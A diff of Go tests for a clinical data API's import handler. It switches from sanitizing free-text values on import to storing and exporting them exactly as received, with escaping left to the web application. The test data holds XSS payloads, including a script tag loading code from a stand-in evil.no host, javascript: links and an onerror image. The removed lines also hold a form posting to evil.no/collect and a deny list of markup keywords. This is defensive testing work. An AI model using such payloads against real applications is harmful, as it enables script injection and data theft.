@@ -2,16 +2,14 @@ package dataapi
 
 import (
 	"net/url"
-	"strings"
 	"testing"
 )
 
-// The §5.2 allowlist proven on the real write path rather than in unit isolation:
-// REQ-VAL-030 promises that every entry path stores sanitized bytes, and all three
-// paths (data API import, UI data entry through PHP, survey link submission) arrive
-// at this one import handler — so what a stored free-text value holds is decided
-// here. The fixture's `notes` field is a `text` field with no validation type, i.e.
-// free-form text under §5.
+// The §5.1 content policy on the real write path: every entry path (data API
+// import, UI data entry through PHP, survey link submission) arrives at this one
+// import handler, so what a stored free-text value holds is decided here. The
+// fixture's `notes` field is a `text` field with no validation type — free-form
+// text under §5.
 
 func importNote(t *testing.T, f *recordFixture, recordID, value string) importRow {
 	t.Helper()
@@ -25,51 +23,33 @@ func importNote(t *testing.T, f *recordFixture, recordID, value string) importRo
 	return rows[0]
 }
 
-// Markup that would be dangerous rendered is gone from the stored value, while the
-// allowlisted formatting REQ-VAL-031 exists to keep survives.
-func TestImportSanitizesFreeText(t *testing.T) {
+// Free text is stored and exported exactly as imported (REQ-VAL-030, DEV-VAL-15):
+// the values the FIONA test run saw rewritten — `"` stored as &#34;, `&` as
+// &amp;, a DICOM series description `<MPR Thick Range>` stored empty — and markup
+// of any kind come back byte for byte, as a REDCap client reads them. Markup is
+// inert because nothing renders a stored value as HTML: the web application
+// escapes every value (REQ-VAL-031), which tests/php/rendering_test.php holds.
+func TestImportStoresFreeTextAsReceived(t *testing.T) {
 	f := newRecordFixture(t)
-
-	cases := []struct{ in, want string }{
-		{"hello <b>world</b>", "hello <b>world</b>"},
-		{"<script>steal()</script>a &amp; b", "a &amp; b"},
-		{`<a href="javascript:alert(1)">x</a>`, "x"},
-		{"<img src=x onerror=alert(1)>", ""},
-		{`<p onclick="steal()" class="x">text</p>`, "<p>text</p>"},
-		{`<div>note: <a href="https://x.no">link</a></div>`, `note: <a href="https://x.no">link</a>`},
-	}
-	for i, c := range cases {
-		rec := "8DISC0" + string(rune('1'+i))
-		importNote(t, f, rec, c.in)
-		got := storedValue(t, f, rec, "baseline_arm_1", "notes")
-		if got != c.want {
-			t.Errorf("import %q stored %q, want %q", c.in, got, c.want)
-		}
-	}
-}
-
-// The point of the policy is that no dangerous construct reaches storage, so a
-// value cannot be rendered as markup later. Asserted directly as well as through
-// the exact-output cases above, because those name one expected serialization
-// while this names the invariant.
-func TestImportStoresNoExecutableMarkup(t *testing.T) {
-	f := newRecordFixture(t)
-	imports := []string{
+	values := []string{
+		"<MPR Thick Range>",
+		`{"StudyDescription": "MR \"knee\"", "note": "a & b"}`,
+		"a &amp; b",
+		"hello <b>world</b>",
 		`<script src="https://evil.no/a.js"></script>note`,
-		`<b onmouseover="steal()">hover</b>`,
-		`<iframe src="https://evil.no"></iframe>`,
-		`<form action="https://evil.no/collect"><input name="x"></form>`,
-		`<a href="data:text/html,<script>alert(1)</script>">click</a>`,
-		`<style>body{display:none}</style>`,
+		`<a href="javascript:alert(1)">x</a>`,
 	}
-	for i, in := range imports {
+	for i, in := range values {
 		rec := "8DISC0" + string(rune('A'+i))
-		importNote(t, f, rec, in)
-		got := storedValue(t, f, rec, "baseline_arm_1", "notes")
-		for _, bad := range []string{"<script", "onmouseover", "<iframe", "<form", "<input", "evil.no", "<style", "javascript:", "data:text/html"} {
-			if strings.Contains(strings.ToLower(got), bad) {
-				t.Errorf("import %q stored %q, which still contains %q", in, got, bad)
-			}
+		if res := importNote(t, f, rec, in); res.ImportRecordID == importInvalid {
+			t.Fatalf("import %q refused: %+v", in, res)
+		}
+		if got := storedValue(t, f, rec, "baseline_arm_1", "notes"); got != in {
+			t.Errorf("import %q stored %q, want it as received", in, got)
+		}
+		rows := f.exportJSON(t, "tok-admin", url.Values{"records[0]": {rec}, "fields[0]": {"notes"}})
+		if len(rows) != 1 || rows[0]["notes"] != in {
+			t.Errorf("export of %q = %v, want the value as imported", in, rows)
 		}
 	}
 }
@@ -96,9 +76,8 @@ func TestImportAcceptsOrdinaryWhitespace(t *testing.T) {
 	}
 }
 
-// A validated field is outside the policy's scope: `age` is an integer and
-// `contact_email` an email, so neither is rewritten — sanitizing a structured value
-// could corrupt it while there is no markup in it to remove.
+// A validated field is stored as received too: `age` is an integer and
+// `contact_email` an email, and neither is rewritten (REQ-VAL-030, DEV-VAL-15).
 func TestImportLeavesStructuredFieldsAlone(t *testing.T) {
 	f := newRecordFixture(t)
 	rows := f.importRows(t, url.Values{
